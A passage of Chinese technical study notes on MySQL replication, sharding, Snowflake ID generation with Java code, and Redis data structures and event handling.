- **备库读取中继日志中的事件，将其重放到备库数据库中**；备库的sql线程执行这一步，该线程从中继日志中读取事件并在备库执行，从而实现备库数据的更新。当Sql线程追赶上IO线程时，中继日志通常已经在系统缓存中，所以中继日志的开销很低。SQL 线程执行的时间也可以通过配置选项来决定是否写入其自己的二进制日志中。

## MySQL读写分离

读写分离一般有至少两个数据库，一个主数据库，一个从数据库，主数据库用来写操作，从数据库用来读操作。

### 适合场景

适用于读远大于写的场景，如果只有一台服务器，当select很多时，update和delete会被这些select访问中的数据堵塞，等待select结束，并发性能不高。对于协和读比例相近的应用，应该部署双主相互复制。

### 优点

- 主从只负责各自的写和读，极大程度的缓解X锁和S锁的争用（如果读操作被设置为锁的话，InnoDB一般不会对select加锁，不管是不是在事务中）
- 分摊读取。可以设置一主多从，对读取操作进行分摊。

## 数据表损坏的修复方式有哪些？

使用 myisamchk 来修复，具体步骤：

1）修复前将mysql服务停止。
2）打开命令行方式，然后进入到mysql的/bin目录。
3）执行myisamchk –recover 数据库所在路径/*.MYI
使用repair table 或者 OPTIMIZE table命令来修复，REPAIR TABLE table_name 修复表 OPTIMIZE TABLE table_name 优化表 REPAIR TABLE 用于修复被破坏的表。 OPTIMIZE TABLE 用于回收闲置的数据库空间，当表上的数据行被删除时，所占据的磁盘空间并没有立即被回收，使用了OPTIMIZE TABLE命令后这些空间将被回收，并且对磁盘上的数据行进行重排（注意：是磁盘上，而非数据库）

# mysql场景题

## 简单的update 的语句做了什么？

前提: student 只有id, 和name 两个字段，且只有id 一个主键，无其他索引。

```sql
update student set name = 'gxw' where id = 2;
```

1. 开启事务，将原内容写入undo log。
2. 去Buffer Pool 中 查找id =2 所对应的数据。
3. 如果在Buffer Pool中查找到了对应的数据，那么直接在Buffer Pool 中直接修改对应数据。如果没有找到，那么先从磁盘中找到对应数据，然后加载到Buffer Pool 中进行修改。
4. 将更新的内容写入redo log。
5. 如果开启了binlog ，还会写入binlog日志。
6. 事务提交进入prepare 阶段，将redo log 刷入磁盘
7. 事务提交进入commit 阶段， 将binlog 输入磁盘

## 百万级别或以上的数据如何删除

关于索引：由于索引需要额外的维护成本，因为索引文件是单独存在的文件,所以当我们对数据的增加,修改,删除,都会产生额外的对索引文件的操作,这些操作需要消耗额外的IO,会降低增/改/删的执行效率。所以，在我们删除数据库百万级别数据的时候，查询MySQL官方手册得知删除数据的速度和创建的索引数量是成正比的。

1. 所以我们想要删除百万数据的时候可以先删除索引（此时大概耗时三分多钟）
2. 然后删除其中无用数据（此过程需要不到两分钟）
3. 删除完成后重新创建索引(此时数据较少了)创建索引也非常快，约十分钟左右。
4. 与之前的直接删除绝对是要快速很多，更别说万一删除中断,一切删除会回滚。那更是坑了。

## 千万级表如何优化查询

当MySQL单表记录数过大时，数据库的CRUD性能会明显下降，一些常见的优化措施如下：

1. 限定数据的范围： 务必禁止不带任何限制数据范围条件的查询语句。比如：我们当用户在查询订单历史的时候，我们可以控制在一个月的范围内。；
2. 读/写分离： 经典的数据库拆分方案，主库负责写，从库负责读；
3. 缓存： 使用MySQL的缓存，另外对重量级、更新少的数据可以考虑使用应用级别的缓存；
4. 还有就是通过分库分表的方式进行优化，主要有垂直分表和水平分表

### **垂直分区**

根据数据库里面数据表的相关性进行拆分。 例如，用户表中既有用户的登录信息又有用户的基本信息，可以将用户表拆分成两个单独的表，甚至放到单独的库做分库。

简单来说垂直拆分是指数据表列的拆分，把一张列比较多的表拆分为多张表。 如下图所示，这样来说大家应该就更容易理解了。

![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOC82LzE2LzE2NDA4NDM1NGJhMmUwZmQ?x-oss-process=image/format,png)

**垂直拆分的优点：** 可以使得行数据变小，在查询时减少读取的Block数，减少I/O次数。此外，垂直分区可以简化表的结构，易于维护。

**垂直拆分的缺点：** 主键会出现冗余，需要管理冗余列，并会引起Join操作，可以通过在应用层进行Join来解决。此外，垂直分区会让事务变得更加复杂；

### 垂直分表

把主键和一些列放在一个表，然后把主键和另外的列放在另一个表中

![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy90dVNhS2M2U2ZQcjh0NFBaVVFJVUszVHl0aWF3T0VRa2dFZnBCTm4xZkNtdEVhMkRaNTlISFNSaWN2SEIzeU43Yk5LY1hkc3NWZGFNb25TOEFKanY5cFdBLzY0MA?x-oss-process=image/format,png)

**适用场景:**

1. 如果一个表中某些列常用，另外一些列不常用

2. 可以使数据行变小，一个数据页能存储更多数据，查询时减少I/O次数

**缺点:**

1. 有些分表的策略基于应用层的逻辑算法，一旦逻辑算法改变，整个分表逻辑都会改变，扩展性较差
2. 对于应用层来说，逻辑算法增加开发成本
3. 管理冗余列，查询所有数据需要join操作

### **水平分区**

保持数据表结构不变，通过某种策略存储数据分片。这样每一片数据分散到不同的表或者库中，达到了分布式的目的。 水平拆分可以支撑非常大的数据量。

水平拆分是指数据表行的拆分，表的行数超过200万行时，就会变慢，这时可以把一张的表的数据拆成多张表来存放。举个例子：我们可以将用户信息表拆分成多个用户信息表，这样就可以避免单一表数据量过大对性能造成影响。
![æ°æ®åºæ°´å¹³æå](https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOC82LzE2LzE2NDA4NGI3ZTllNDIzZTM?x-oss-process=image/format,png)

水平拆分可以支持非常大的数据量。需要注意的一点是:分表仅仅是解决了单一表数据过大的问题，但由于表的数据还是在同一台机器上，其实对于提升MySQL并发能力没有什么意义，所以 水平拆分最好分库 。

水平拆分能够 支持非常大的数据量存储，应用端改造也少，但 分片事务难以解决 ，跨界点Join性能较差，逻辑复杂。

《Java工程师修炼之道》的作者推荐 尽量不要对数据进行分片，因为拆分会带来逻辑、部署、运维的各种复杂度 ，一般的数据表在优化得当的情况下支撑千万以下的数据量是没有太大问题的。如果实在要分片，尽量选择客户端分片架构，这样可以减少一次和中间件的网络I/O。

### 水平分表

表很大，分割后可以降低在查询时需要读的数据和索引的页数，同时也降低了索引的层数，提高查询次数

![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy90dVNhS2M2U2ZQcjh0NFBaVVFJVUszVHl0aWF3T0VRa2dkQVpyU1Y3M2liMWZkRENYS2M3QUd6Wmhid3FjS0ZVWkpGWThwMFZkVXRPM3JNYzZ2eDFBdzVBLzY0MA?x-oss-process=image/format,png)

**适用场景：**

1. 表中的数据本身就有独立性，例如表中分表记录各个地区的数据或者不同时期的数据，特别是有些数据常用，有些不常用。
2. 需要把数据存放在多个介质上。

**水平切分的缺点：**

1. 给应用增加复杂度，通常查询时需要多个表名，查询所有数据都需UNION操作
2. 在许多数据库应用中，这种复杂度会超过它带来的优点，查询时会增加读一个索引层的磁盘次数

下面补充一下数据库分片的两种常见方案：

1. 客户端代理： 分片逻辑在应用端，封装在jar包中，通过修改或者封装JDBC层来实现。 当当网的 Sharding-JDBC 、阿里的TDDL是两种比较常用的实现。
2. 中间件代理： 在应用和数据中间加了一个代理层。分片逻辑统一维护在中间件服务中。 我们现在谈的 Mycat 、360的Atlas、网易的DDB等等都是这种架构的实现。

### **分库分表后面临的问题**

* 事务支持 分库分表后，就成了分布式事务了。如果依赖数据库本身的分布式事务管理功能去执行事务，将付出高昂的性能代价； 如果由应用程序去协助控制，形成程序逻辑上的事务，又会造成编程方面的负担。

* 跨库join

  只要是进行切分，跨节点Join的问题是不可避免的。但是良好的设计和切分却可以减少此类情况的发生。解决这一问题的普遍做法是分两次查询实现。在第一次查询的结果集中找出关联数据的id,根据这些id发起第二次请求得到关联数据。 分库分表方案产品

* 跨节点的count,order by,group by以及聚合函数问题 这些是一类问题，因为它们都需要基于全部数据集合进行计算。多数的代理都不会自动处理合并工作。解决方案：与解决跨节点join问题的类似，分别在各个节点上得到结果后在应用程序端进行合并。和join不同的是每个结点的查询可以并行执行，因此很多时候它的速度要比单一大表快很多。但如果结果集很大，对应用程序内存的消耗是一个问题。

* 数据迁移，容量规划，扩容等问题 来自淘宝综合业务平台团队，它利用对2的倍数取余具有向前兼容的特性（如对4取余得1的数对2取余也是1）来分配数据，避免了行级别的数据迁移，但是依然需要进行表级别的迁移，同时对扩容规模和分表数量都有限制。总得来说，这些方案都不是十分的理想，多多少少都存在一些缺点，这也从一个侧面反映出了Sharding扩容的难度。

* ID问题

* 一旦数据库被切分到多个物理结点上，我们将不能再依赖数据库自身的主键生成机制。一方面，某个分区数据库自生成的ID无法保证在全局上是唯一的；另一方面，应用程序在插入数据之前需要先获得ID,以便进行SQL路由. 一些常见的主键生成策略

UUID 使用UUID作主键是最简单的方案，但是缺点也是非常明显的。由于UUID非常的长，除占用大量存储空间外，最主要的问题是在索引上，在建立索引和基于索引进行查询时都存在性能问题。 Twitter的分布式自增ID算法Snowflake 在分布式系统中，需要生成全局UID的场合还是比较多的，twitter的snowflake解决了这种需求，实现也还是很简单的，除去配置信息，核心代码就是毫秒级时间41位 机器ID 10位 毫秒内序列12位。

* 跨分片的排序分页

一般来讲，分页时需要按照指定字段进行排序。当排序字段就是分片字段的时候，我们通过分片规则可以比较容易定位到指定的分片，而当排序字段非分片字段的时候，情况就会变得比较复杂了。为了最终结果的准确性，我们需要在不同的分片节点中将数据进行排序并返回，并将不同分片返回的结果集进行汇总和再次排序，最后再返回给用户。如下图所示：


![å¨è¿éæå¥å¾çæè¿°](https://img-blog.csdnimg.cn/20200310170753848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RoaW5rV29u,size_16,color_FFFFFF,t_70)



## 雪花算法

其核心思想就是：使用一个 64 bit 的 long 型的数字作为全局唯一 id。在分布式系统中的应用十分广泛，且ID 引入了时间戳，保持自增性且不重复。

### 雪花算法的结构：

![img](https://img2020.cnblogs.com/blog/1383365/202007/1383365-20200713200251795-773057346.png)

　　主要分为 5 个部分：

1. 是 1 个 bit：0，这个是无意义的。
2. 是 41 个 bit：表示的是时间戳。
3. 是 10 个 bit：表示的是机房 id，0000000000，因为我传进去的就是0。
4. 是 12 个 bit：表示的序号，就是某个机房某台机器上这一毫秒内同时生成的 id 的序号，0000 0000 0000。

　　接下去我们来解释一下四个部分：

**1 bit，是无意义的：**

　　因为二进制里第一个 bit 为如果是 1，那么都是负数，但是我们生成的 id 都是正数，所以第一个 bit 统一都是 0。

**41 bit：表示的是时间戳，单位是毫秒。**

　　41 bit 可以表示的数字多达 2^41 - 1，也就是可以标识 2 ^ 41 - 1 个毫秒值，换算成年就是表示 69 年的时间。

**10 bit：记录工作机器 id，代表的是这个服务最多可以部署在 2^10 台机器上，也就是 1024 台机器。**

　　但是 10 bit 里 5 个 bit 代表机房 id，5 个 bit 代表机器 id。意思就是最多代表 2 ^ 5 个机房（32 个机房），每个机房里可以代表 2 ^ 5 个机器（32 台机器），这里可以随意拆分，比如拿出4位标识业务号，其他6位作为机器号。可以随意组合。

**12 bit：这个是用来记录同一个毫秒内产生的不同 id。**

　　12 bit 可以代表的最大正整数是 2 ^ 12 - 1 = 4096，也就是说可以用这个 12 bit 代表的数字来区分同一个毫秒内的 4096 个不同的 id。也就是同一毫秒内同一台机器所生成的最大ID数量为4096

 　简单来说，你的某个服务假设要生成一个全局唯一 id，那么就可以发送一个请求给部署了 SnowFlake 算法的系统，由这个 SnowFlake 算法系统来生成唯一 id。这个 SnowFlake 算法系统首先肯定是知道自己所在的机器号，（这里姑且讲10bit全部作为工作机器ID）接着 SnowFlake 算法系统接收到这个请求之后，首先就会用二进制位运算的方式生成一个 64 bit 的 long 型 id，64 个 bit 中的第一个 bit 是无意义的。接着用当前时间戳（单位到毫秒）占用41 个 bit，然后接着 10 个 bit 设置机器 id。最后再判断一下，当前这台机房的这台机器上这一毫秒内，这是第几个请求，给这次生成 id 的请求累加一个序号，作为最后的 12 个 bit。

### 代码实现：

　　代码中将 10 bit 拆分成 5bit表示工作机器ID，5bit表示数据中心ID

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```java
public class SnowflakeIdWorker {

    // ==============================Fields===========================================
    /** 开始时间戳 (2015-01-01) */
    private final long twepoch = 1420041600000L;

    /** 机器id所占的位数 */
    private final long workerIdBits = 5L;

    /** 数据标识id所占的位数 */
    private final long datacenterIdBits = 5L;

    /** 序列在id中占的位数 */
    private final long sequenceBits = 12L;

    /** 支持的最大机器id，结果是31 (这个移位算法可以很快的计算出几位二进制数所能表示的最大十进制数) */
    private final long maxWorkerId = -1L ^ (-1L << workerIdBits);

    /** 支持的最大数据标识id，结果是31 */
    private final long maxDatacenterId = -1L ^ (-1L << datacenterIdBits);

    /** 机器ID向左移12位 */
    private final long workerIdShift = sequenceBits;

    /** 数据标识id向左移17位(12+5) */
    private final long datacenterIdShift = sequenceBits + workerIdBits;

    /** 时间戳向左移22位(5+5+12) */
    private final long timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits;

    /** 生成序列的掩码，这里为4095 (0b111111111111=0xfff=4095) */
    private final long sequenceMask = -1L ^ (-1L << sequenceBits);

    /** 工作机器ID(0~31) */
    private long workerId;

    /** 数据中心ID(0~31) */
    private long datacenterId;

    /** 毫秒内序列(0~4095) */
    private long sequence = 0L;

    /** 上次生成ID的时间戳 */
    private long lastTimestamp = -1L;

    //==============================Constructors=====================================
    /**
     * 构造函数
     * @param workerId 工作ID (0~31)
     * @param datacenterId 数据中心ID (0~31)
     */
    public SnowflakeIdWorker(long workerId, long datacenterId) {
        if (workerId > maxWorkerId || workerId < 0) {
            throw new IllegalArgumentException(String.format("worker Id can't be greater than %d or less than 0", maxWorkerId));
        }
        if (datacenterId > maxDatacenterId || datacenterId < 0) {
            throw new IllegalArgumentException(String.format("datacenter Id can't be greater than %d or less than 0", maxDatacenterId));
        }
        this.workerId = workerId;
        this.datacenterId = datacenterId;
    }

    // ==============================Methods==========================================
    /**
     * 获得下一个ID (该方法是线程安全的)
     * @return SnowflakeId
     */
    public synchronized long nextId() {
        long timestamp = timeGen();

        //如果当前时间小于上一次ID生成的时间戳，说明系统时钟回退过这个时候应当抛出异常
        if (timestamp < lastTimestamp) {
            throw new RuntimeException(
                    String.format("Clock moved backwards.  Refusing to generate id for %d milliseconds", lastTimestamp - timestamp));
        }

        //如果是同一时间生成的，则进行毫秒内序列
        if (lastTimestamp == timestamp) {
            sequence = (sequence + 1) & sequenceMask;
            //毫秒内序列溢出
            if (sequence == 0) {
                //阻塞到下一个毫秒,获得新的时间戳
                timestamp = tilNextMillis(lastTimestamp);
            }
        }
        //时间戳改变，毫秒内序列重置
        else {
            sequence = 0L;
        }

        //上次生成ID的时间戳
        lastTimestamp = timestamp;

        //移位并通过或运算拼到一起组成64位的ID
        return ((timestamp - twepoch) << timestampLeftShift) //
                | (datacenterId << datacenterIdShift) //
                | (workerId << workerIdShift) //
                | sequence;
    }

    /**
     * 阻塞到下一个毫秒，直到获得新的时间戳
     * @param lastTimestamp 上次生成ID的时间戳
     * @return 当前时间戳
     */
    protected long tilNextMillis(long lastTimestamp) {
        long timestamp = timeGen();
        while (timestamp <= lastTimestamp) {
            timestamp = timeGen();
        }
        return timestamp;
    }

    /**
     * 返回以毫秒为单位的当前时间
     * @return 当前时间(毫秒)
     */
    protected long timeGen() {
        return System.currentTimeMillis();
    }

    //==============================Test=============================================
    /** 测试 */
    public static void main(String[] args) {
        SnowflakeIdWorker idWorker = new SnowflakeIdWorker(0, 0);
        for (int i = 0; i < 1000; i++) {
            long id = idWorker.nextId();
            System.out.println(Long.toBinaryString(id));
            System.out.println(id);
        }
    }
}
```

　　SnowFlake的优点是，整体上按照时间自增排序，并且整个分布式系统内不会产生ID碰撞(由数据中心ID和机器ID作区分)，并且效率较高，经测试，SnowFlake每秒能够产生26万ID左右。但是依赖与系统时间的一致性，如果系统时间被回调，或者改变，可能会造成id冲突或者重复。实际中我们的机房并没有那么多，我们可以改进改算法，将10bit的机器id优化，成业务表或者和我们系统相关的业务。

　　其实对于分布式ID的生成策略。无论是我们上述提到的哪一种。无非需要具有以下两种特点。 **自增的、不重复的。**而对于不重复且是自增的，那么我们是很容易想到的是时间，而雪花算法就是基于时间戳。但是毫秒级的并发下如果直接拿来用，显然是不合理的。那么我们就要在这个时间戳上面做一些文章。至于怎么能让这个东西保持唯一且自增。就要打开自己的脑洞了。可以看到雪花算法中是基于 synchronized 锁进行实现的。如果小伙伴们有其他更好的想法请在下方留言哦。

## MySQL数据库cpu飙升到500%的话他怎么处理？

当 cpu 飙升到 500%时，先用操作系统命令 top 命令观察是不是 mysqld 占用导致的，如果不是，找出占用高的进程，并进行相关处理。

如果是 mysqld 造成的， show processlist，看看里面跑的 session 情况，是不是有消耗资源的 sql 在运行。找出消耗高的 sql，看看执行计划是否准确， index 是否缺失，或者实在是数据量太大造成。

一般来说，肯定要 kill 掉这些线程(同时观察 cpu 使用率是否下降)，等进行相应的调整(比如说加索引、改 sql、改内存参数)之后，再重新跑这些 SQL。

也有可能是每个 sql 消耗资源并不多，但是突然之间，有大量的 session 连进来导致 cpu 飙升，这种情况就需要跟应用一起来分析为何连接数会激增，再做出相应的调整，比如说限制连接数等

# 数据库之Redis

## Redis概述（6379）

Redis（Remote Dictionary Server），即远程字典服务。是一个开源的、使用C语言编写、支持网络、可基于内存亦可持久化的日志型、key-value数据库，并提供多种语言的API。

Redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave（主从）同步。

Redis是**单线程**（因为全部数据在内存中，使用单线程可以取消线程切换时的上下文切换资源消耗）的，基于内存操作，同时使用IO多路复用模型。

##### 单线程优点

- 代码更清晰，处理逻辑更简单
- 不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗
- 不存在多进程或者多线程导致的切换而消耗CPU

##### 缺点

- 无法发挥多核CPU性能，不过可以通过在单机开多个Redis实例来完善；

Redis键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。

Redis中键值和值都是用`SDS(Simple Dynamic String)`存储。string同C语言一样，末尾保存一个'\0'，但是不计算在len中。

```
struct sdshdr{
	int len;		// 记录buf数组中已使用字节的数量，也就是SDS中字符串的长度
	int free;		// 记录未使用字节的数量
	char buf[];		// 字节数组
};
```

### Redis特性

- 多样的数据类型
- 持久化
- 集群
- 事务

### 基本指令

```
select num	# 默认有16各数据库，num为0-15
keys *		# 查看数据库所有的key
flushdb		# 清空当前库
flushall	# 清空全部的数据库
```

### 重要指令

```bash
KEYS 	*				# 查看所有的key
SET 	_key _value		# 设置key
GET 	_key			# 获取key的value
EXISTS 	_key			# 判断key是否存在
MOVE 	_key _num		# 将指定key移动到num号数据库
EXPIRE 	_key _sec		# 设置key过期时间，单位是秒
TTL 	_key			# 查看key的剩余时间
TYPE	_key			# 查看key的类型
```

## Redis和Memcached区别

### Redis优点

- 支持多种数据结构，如 string（字符串）、 list(双向链表)、dict(hash表)、set(集合）、zset(排序set)
- 支持持久化操作，可以进行aof及rdb数据持久化到磁盘，从而进行数据备份或数据恢复等操作，较好的防止数据丢失的手段。
- 支持通过Replication进行数据复制，通过master-slave机制，可以实时进行数据的同步复制，支持多级复制和增量复制，master-slave机制是Redis进行HA的重要手段。
- 单线程请求，所有命令串行执行，并发情况下不需要考虑数据一致性问题。
- 支持pub/sub消息订阅机制，可以用来进行消息订阅与通知。

### Redis缺点

- Redis只能使用单线程，性能受限于CPU性能，故单实例CPU最高才可能达到5-6wQPS每秒（取决于数据结构，数据大小以及服务器硬件性能，日常环境中QPS高峰大约在1-2w左右）。
- 支持简单的事务需求，但业界使用场景很少，并不成熟，既是优点也是缺点。
- Redis在string类型上会消耗较多内存，可以使用dict（hash表）压缩存储以降低内存耗用。

### Memcached优点

- Memcached可以利用多核优势，单实例吞吐量极高，可以达到几十万QPS（取决于key、value的字节大小以及服务器硬件性能，日常环境中QPS高峰大约在4-6w左右）。适用于最大程度扛量。
- 支持直接配置为session handle。

### Memcache缺点

- 只支持简单的key/value数据结构，不像Redis可以支持丰富的数据类型。
- 无法进行持久化，数据不能备份，只能用于缓存使用，且重启后数据全部丢失。
- 无法进行数据同步，不能将MC中的数据迁移到其他MC实例中。
- Memcached内存分配采用Slab Allocation机制管理内存，value大小分布差异较大时会造成内存利用率降低，并引发低利用率时依然出现踢出等问题。需要用户注重value设计。

### 区别

两者都是非关系型内存键值数据库，主要有以下不同：

- **网络IO模型**：Redis使用单线程的IO复用模型，自己封装了一个简单的AeEvent事件处理框架，主要实现了epoll，kqueue和select，对于单存只有IO操作来说，单线程可以将速度优势发挥到最大；Memcached是多线程，非阻塞IO复用的网络模型，分为监听主线程和worker子线程，主线程监听网络连接，接受请求后，将连接描述字pipe传递给worker线程，进行读写IO，网络层使用libevent封装的事件库，多线程模型可以发挥多核作用，但是引入了cache coherency和锁的问题。

- **数据类型：**Redis支持五种不同的类型，可以更灵活的解决问题；Memcached仅支持字符串类型
- **数据持久化：**Redis支持两种持久化策略（RDB快照和AOF日志）；Memcached不支持持久化
- **分布式：**Redis Cluster实现了对分布式的支持；Memcached不支持分布式，只能通过在客户端使用一致性哈希来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。
- **内存管理机制：**
  - Redis中，并不是所有的数据都一直在内存中，可以将一些很久没用的value交换到磁盘；Memcached的数据一直在内存中。
  - Memcached将内存分割为特定长度的块来存储数据，以解决内存碎片的问题，但是这种方式会导致内存使用率不高。

## redis事件驱动详解

#### 事件驱动数据结构

- 事件循环结构体aeEventLoop：事件循环结构体维护 I/O 事件表，定时事件表和触发事件表。
  - 文件事件结构体：aefileevent
  - 时间事件结构体：aetimeevent
  - 触发事件结构体：aefiredevent

- redis 的主函数中调用 initServer() 函数从而初始化事件循环中心（EventLoop），它的主要工作是在 aeCreateEventLoop() 中完成的。

#### 事件驱动原理

- 事件注册：文件 I/O 事件注册主要操作在 aeCreateFileEvent() 中完成。aeCreateFileEvent() 会根据文件描述符的数值大小在事件循环结构体的 I/O 事件表中取一个数据空间，利用系统提供的 I/O 多路复用技术监听感兴趣的 I/O 事件，并设置回调函数。

  - 对于不同版本的 I/O 多路复用，比如 epoll，select，kqueue 等，redis 有各自的版本，但接口统一，譬如 aeApiAddEvent()，会有多个版本的实现。
  - ![img](http://daoluan.net/redis-source-notes/assets/event-model-1.png)

  

- 准备监听的工作：redis 提供了 TCP 和 UNIX 域套接字两种工作方式。以 TCP 工作方式为例，listenPort() 创建绑定了套接字并启动了监听

- 为监听的套接字注册事件：initServer() 为所有的监听套接字注册了读事件（读事件表示有新的连接到来），响应函数为 acceptTcpHandler() 或者 acceptUnixHandler()。

  - acceptCommonHandler() 主要工作就是：
    - 建立并保存服务端与客户端的连接信息，这些信息保存在一个 struct redisClient 结构体中；
    - 为与客户端连接的套接字注册读事件，相应的回调函数为 readQueryFromClient()，readQueryFromClient() 作用是从套接字读取数据，执行相应操作并回复客户端。

- 进入事件循环：发生在 aeProcessEvents() 中：

  - 根据定时事件表计算需要等待的最短时间；
  - 调用 redis api aeApiPoll() 进入监听轮询，如果没有事件发生就会进入睡眠状态，其实就是 I/O 多路复用 select() epoll() 等的调用；
  - 有事件发生会被唤醒，处理已触发的 I/O 事件和定时事件。

- aeApiPoll() 调用了 select() 进入了监听轮询。aeApiPoll() 的 tvp 参数是最小等待时间，它会被预先计算出来，它主要完成：

  - 拷贝读写的 fdset。select() 的调用会破坏传入的 fdset，实际上有两份 fdset，一份作为备份，另一份用作调用。每次调用 select() 之前都从备份中直接拷贝一份；
  - 调用 select()；
  - 被唤醒后，检查 fdset 中的每一个文件描述符，并将可读或者可写的描述符记录到触发表当中。

  接下来的操作便是执行相应的回调函数，先处理 I/O 事件，再处理定时事件。

## redis如何提供服务

#### 详细过程

- 初始化：redis 在启动做了一些初始化逻辑，比如配置文件读取（initserverconfig），数据中心初始化，网络通信模块初始化等（initserver），待所有初始化任务完毕后，便开始进入事件循环等待请求（aemain）。
- redis 注册了回调函数 acceptTcpHandler()，当有新的连接到来时，这个函数会被回调

- 获取客户端的数据：readQueryFromClient() 则是获取来自客户端的数据，接下来它会调用 processInputBuffer() 解析命令和执行命令，对于命令的执行，调用的是函数 processCommand()。
  - redis 首先根据客户端给出的命令字在命令表中查找对应的 c->cmd, 找到命令结构提之后直接调用相应的回调函数指针

## Redis数据结构

### SDS

简单动态字符串（simple dynamic string），redis中使用sds作为默认字符串。

```c
struct sdshdr{
    // 1 bytes
	uint8_t len;		// 字符串长度
    // 1 bytes
	uint8_t free;		// buf数组中未使用的字节数量
	// 1 bytes
    unsigned char flags;
	char buf[];		// 字符串数组，最后有一个隐式的'\0'
};
```

#### 与C字符串区别

- 常数时间复杂度获取字符串长度
- 不会发生缓冲区溢出，由于sds知道自己的字符串长度和剩余空间，所以当不足时可以自动扩展空间
- 减少修改字符串时带来的内存重分配次数。
  - sds通过未使用空间解除了字符串长度和底层数组长度之间的关联；SDS通过未使用空间实现了空间预分配和惰性空间释放两种优化策略
  - 空间预分配：用于优化字符串增长操作，当sds需要扩展空间的时候，程序不仅会对sds分配修改所需要的空间，同时还会为sds分配额外的未使用空间。
    - 如果扩展之后空间小于1M，程序会分配和len属性大小相同的未使用空间，即len=free
    - 如果大于1M，程序会额外分配1M的未使用空间，即free=1M
  - 惰性空间释放：用于优化sds的缩短操作，当sds需要缩短空间的时候，程序不立即使用内存重分配来回收缩短后多出来的字节，而是使用free属性将其存起来。
- 二进制安全，C字符串只能保存文本数据，sds可以保存文本或者二进制数据，可以识别出'\0'
- 兼容部分C字符串函数

### 链表list

双端，无环，带有表头指针和表尾指针，带链表长度计数器。

多态：链表节点使用void*指针来保存节点值，并且通过list结构的dup、free、match三个属性为节点值设置类型特定函数，所以链表可以用于保存各种不同类型的值。

```c++
typedef struct listNode{
	struct listNode *pre;
	struct listNode *next;
	void* value;
};

typedef sturct list{
	listNode *head;
	listNode *tail;
	unsigned long len;
	void *(*dup) (void *ptr);		// 节点值复制函数
	void (*free) (void *ptr);		// 节点值释放函数
	int (*match) (void *ptr, void *key);	// 节点值对比函数
}list;
```

### 字典

`dictht`是一个散列表结构，使用拉链法解决哈希冲突。

```c++
// 一个哈希表结构，每个字典有两个这样的结构
typedef struct dictht{
	dictEntry **table;			// 哈希表数组
	unsigned long size;			// 哈希表大小
	unsigned long sizemask;		// 哈希表大小掩码，用于计算索引值，总是等于size-1
	unsigned long used;			// 该哈希表已有节点的数量
}dictht;

// 哈希表节点结构
typedef struct dictEntry{
	void *key;			// 键
	union{				// 值
		void *val;
		uint64_t u64;
		int64_t s64;
		double d;
	}v;
	struct dictEntry *next;	// 指向下一个哈希表节点，形成链表，用来解决键冲突
}dictEntry;
```

`Redis`的字典`dict`包含两个哈希表`dictht`，这是为了方便进行`rehash`操作，在扩容时，将其中一个`dictht`上的键值对`rehash`到另一个`dictht`上面，完成之后释放空间并交换两个`dictht`的角色。

```c++
typedef struct dict{
	dictType *type;			// 类型特定函数
	void *privdata;			// 私有数据
	dictht ht[2];			// 哈希表，一般只使用ht[0]，ht[1]是用来rehash的
	long rehashidx;			// 记录rehash目前的进度，如果没有进行rehash他的值为-1
	unsigned long iterators;// 当前运行的迭代器的数量
}dict;
```

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\normdic.png" alt="img" style="zoom:90%;" />
</div>

#### 字典中的哈希算法

```c
hash = dict->type->hashFunction(key);
index = hash & index->ht[0].sizemask;
```

#### 字典解决键冲突（哈希冲突）

Redis的哈希表使用**链地址法**解决哈希冲突，每个哈希表节点上都有一个next指针，多个哈希表节点可以用next指针构成一个单向链表，被分配到同一个索引上的多个节点可以用这个单项链表连接起来。

程序总是将新节点添加到链表的表头为止（复杂度为O(1)），排在其他已有节点的前面。

#### 字典的rehash

当哈希表中键值对主键增多或者减少，为了让哈希表的负载因子维持在一个合理的范围内，当哈希表键值对数量太多或者太少，程序需要对哈希表的大小进行相应的扩展或者收缩，也就是rehash操作。

**rehash步骤：**

- 为字典的ht[1]哈希表分配空间，空间大小取决于要执行的操作以及ht[0]当前包含的键值对数量。
  - 扩展操作：ht[1]的大小为第一个大于等于`ht[0].used*2的2^n`（会考虑redis是否正在bgsave，但是如果过多也会强制扩容）
  - 收缩操作：ht[1]的大小为第一个大于等于`ht[0].used的2^n`（缩容条件：小于10%，不会考虑是否正在besave）
- 将保存在ht[0]中的所有键值对rehash到ht[1]上：rehash指重新计算键的哈希值和索引值，然后放置在ht[1]的指定位置上
- 当ht[0]中的键值对迁移完成之后，释放ht[0]，将ht[1]设置为ht[0]，并在ht[1]上创建一个空白哈希表。

**rehash操作不是一次性完成的，而是采用渐进方式**，这是为了避免一次性执行过多的rehash操作给服务器带来过大的负担。

**渐进式rehash步骤：**

- 为ht[1]分配空间，让字典同时持有ht[0]和ht[1]两个哈希表
- 在字典中维持一个索引计数器变量`rehashidx`，并将其设置为0，表示渐进式rehash开始
- 在rehash期间，每次对字典进行**添加、删除、查找或者更新操作**时，会顺带将ht[0]哈希表在rehashidx索引上的所有键值对rehash到ht[1]上，之后将该值加1
- 完成全部键值对rehash之后，程序将rehashidx属性值设置为-1，表示操作完成。

采用渐进式rehash会导致字典中的数据分散在两个dictht上，因此对字典的查找操作也需要到对应的dictht去执行。

添加操作之后保存到ht[1]中，可以保证ht[0]中的键值对只减不增。

### 跳跃列表

是有序集合的底层实现之一。是一种有序数据结构，通过在每个节点中维持多个指向其他节点的指针，从而达到快速访问节点的目的。

跳跃表支持平均O(logN)，最坏O(N)复杂度的节点查找，还可以通过顺序性操作来批量处理节点。

